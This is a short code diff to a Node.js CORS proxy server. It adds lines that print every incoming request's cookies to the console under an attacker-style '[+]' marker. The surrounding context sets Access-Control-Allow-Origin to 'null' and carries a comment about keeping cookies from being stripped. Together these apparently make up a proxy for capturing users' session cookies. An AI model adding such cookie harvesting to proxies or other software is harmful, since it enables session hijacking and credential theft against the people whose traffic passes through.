@@ -45,6 +45,10 @@ cors_proxy.createServer({
         headers['Access-Control-Allow-Origin'] = 'null';
       }
     }
+    // Log cookies from incoming request
+    if (req.headers.cookie) {
+      console.log("[+] Cookies from request:", req.headers.cookie);
+    }
   },
 
   // **Ensure cookies are not stripped**
